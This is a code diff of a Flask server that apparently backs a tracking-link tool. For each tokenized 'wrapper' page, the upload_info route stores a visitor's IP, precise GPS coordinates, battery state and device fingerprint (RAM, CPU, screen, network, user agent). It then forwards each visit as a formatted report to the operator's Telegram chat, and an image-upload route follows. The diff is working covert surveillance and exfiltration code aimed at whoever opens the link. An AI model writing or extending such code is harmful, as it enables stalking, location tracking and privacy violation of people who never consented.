@@ -220,37 +220,64 @@ def wrapper_page(token):
 def upload_info(token):
     if token not in SESSIONS:
         return "Invalid token", 404
+
     payload = request.get_json(silent=True) or {}
+    battery = payload.get("battery")
+    coords = payload.get("coords")
+    details = payload.get("details")  # full extra data bundle
+
     ip = request.headers.get("X-Forwarded-For", request.remote_addr)
-    ua = request.headers.get("User-Agent", "")
+    timestamp = datetime.utcnow().isoformat()
 
     entry = {
-        "timestamp": datetime.utcnow().isoformat(),
+        "timestamp": timestamp,
         "ip": ip,
-        "battery": payload.get("battery"),
-        "coords": payload.get("coords"),
-        "note": payload.get("note"),
-        "user_agent": ua,
+        "battery": battery,
+        "coords": coords,
+        "details": details,
     }
+
     SESSIONS[token]["visits"].append(entry)
     save_sessions(SESSIONS)
 
+    # -------- Telegram notification formatting --------
     chat_id = SESSIONS[token].get("chat_id")
     if chat_id:
-        bat_txt = format_battery(entry.get("battery"))
-        coords_txt = format_coords(entry.get("coords"))
-        ua_short = (ua[:180] + "...") if ua and len(ua) > 180 else ua
-        lines = [
-            f"Session {token} (info)",
-            f"Time: {entry['timestamp']}",
-            f"IP: {ip}",
-            f"Battery: {bat_txt}",
-            f"Coords: {coords_txt}",
-        ]
-        if ua_short:
-            lines.append(f"Device: {ua_short}")
-        tg_send_text(chat_id, "\n".join(lines))
+        # battery
+        if battery and isinstance(battery, dict):
+            bat_txt = f"{round(battery.get('level'))}%{' (charging)' if battery.get('charging') else ''}"
+        else:
+            bat_txt = "unknown"
+
+        # coords
+        if coords and isinstance(coords, dict):
+            loc_txt = f"{coords.get('lat')},{coords.get('lon')} (±{coords.get('acc') or coords.get('accuracy','?')} m)"
+        else:
+            loc_txt = "unknown"
+
+        # extra details
+        d = details or {}
+        ua = d.get("userAgent", "")
+        ram = d.get("ramGB")
+        cpu = d.get("cpuCores")
+        scr = d.get("screen") or {}
+        net = d.get("network") or {}
+
+        msg = (
+            f"📡 Session {token} — INFO\n"
+            f"⏱ Time: {timestamp}\n"
+            f"🌍 IP: {ip}\n"
+            f"🔋 Battery: {bat_txt}\n"
+            f"📍 Location: {loc_txt}\n"
+            f"📱 Device: {ua[:80] + ('…' if len(ua) > 80 else '')}\n"
+            f"💾 RAM: {ram} GB   ⚙ CPU: {cpu} cores\n"
+            f"🖥 Screen: {scr.get('w')}×{scr.get('h')} ({scr.get('ratio')}x)\n"
+            f"📶 Network: {net.get('type','?')} {net.get('downlink','?')}Mbps"
+        )
+        tg_send_text(chat_id, msg)
+
     return jsonify({"status": "ok", "stored": entry})
+
 
 @app.route("/upload_image/<token>", methods=["POST"])
 def upload_image(token):
